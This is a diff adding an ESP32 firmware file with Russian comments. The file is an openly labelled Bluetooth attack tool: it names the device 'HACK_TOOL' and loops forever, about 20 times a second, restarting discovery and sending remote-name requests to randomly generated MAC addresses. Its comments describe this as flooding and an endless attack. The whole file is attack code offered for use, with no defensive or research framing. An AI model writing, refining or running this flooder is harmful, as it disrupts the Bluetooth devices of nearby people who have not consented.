@@ -1,0 +1,55 @@
+#include "esp_bt.h"
+#include "esp_bt_main.h"
+#include "esp_gap_bt_api.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "driver/gpio.h"
+
+#define LED_PIN 2  // Встроенный светодиод на ESP32
+#define ATTACK_DELAY 50  // 20 атак в секунду
+
+void blink_attack() {
+    gpio_set_level(LED_PIN, 1);
+    vTaskDelay(10 / portTICK_PERIOD_MS);
+    gpio_set_level(LED_PIN, 0);
+}
+
+void bt_attack() {
+    // Массив случайных MAC для флуда
+    esp_bd_addr_t fake_mac = {0x00,0x00,0x00,0x00,0x00,0x00};
+    
+    for(int i=0; i<6; i++) {
+        fake_mac[i] = esp_random() % 256; // Случайный MAC
+    }
+    
+    // Агрессивный discovery
+    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 1, 0);
+    
+    // Спам запросами
+    esp_bt_gap_read_remote_name(fake_mac);
+    
+    blink_attack(); // Мигаем при каждой атаке
+}
+
+void app_main() {
+    // Настройка светодиода
+    gpio_set_direction(LED_PIN, GPIO_MODE_OUTPUT);
+    
+    // Инициализация Bluetooth
+    esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    esp_bt_controller_init(&cfg);
+    esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
+    esp_bluedroid_init();
+    esp_bluedroid_enable();
+    
+    // Мощные настройки
+    esp_bt_dev_set_device_name("HACK_TOOL");
+    esp_bt_connection_mode_t conn_mode = ESP_BT_CONNECTABLE;
+    esp_bt_gap_set_scan_mode(conn_mode, ESP_BT_NON_DISCOVERABLE);
+    
+    // Бесконечная атака
+    while(1) {
+        bt_attack();
+        vTaskDelay(ATTACK_DELAY / portTICK_PERIOD_MS);
+    }
+}
